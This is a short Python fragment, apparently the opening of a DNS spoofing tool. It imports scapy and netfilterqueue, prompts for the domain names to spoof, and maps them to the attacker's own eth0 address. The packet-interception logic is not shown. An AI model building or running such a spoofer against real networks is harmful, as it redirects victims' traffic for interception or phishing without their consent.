from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

domainname = input("What domain name to spoof? ")
scnddomainname = input("Secondary Names? ")
ipRedirect = get_if_addr("eth0")

dns_hosts = {
    domainname : ipRedirect,
    scnddomainname : ipRedirect
}